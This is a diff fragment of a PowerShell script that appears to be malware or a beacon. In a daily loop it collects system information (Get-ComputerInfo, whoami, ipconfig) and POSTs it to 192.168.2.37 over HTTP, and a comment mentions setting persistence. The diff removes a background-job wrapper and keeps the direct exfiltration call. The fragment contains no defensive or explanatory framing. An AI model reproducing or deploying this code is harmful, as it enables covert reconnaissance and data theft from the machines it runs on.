@@ -126,14 +126,7 @@ start-sleep 4
 
 #httpsend
 
-$timeoutSeconds = 3
-$code = {
-    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
-    Get-ChildItem *.cs | select name
-}
-$j = Start-Job -ScriptBlock $code
-if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }
-Remove-Job -force $j
+$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
 
 #attempt to set per
 
@@ -162,14 +155,8 @@ while($true)
     $varper += Get-ComputerInfo;whoami;Get-Date;ipconfig
     
     #http send
-    $timeoutSeconds = 3
-    $code = {
-        $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
-        Get-ChildItem *.cs | select name
-    }
-    $j = Start-Job -ScriptBlock $code
-    if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }
-    Remove-Job -force $j
+
+    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
 
     Start-Sleep -Seconds 86400
 }
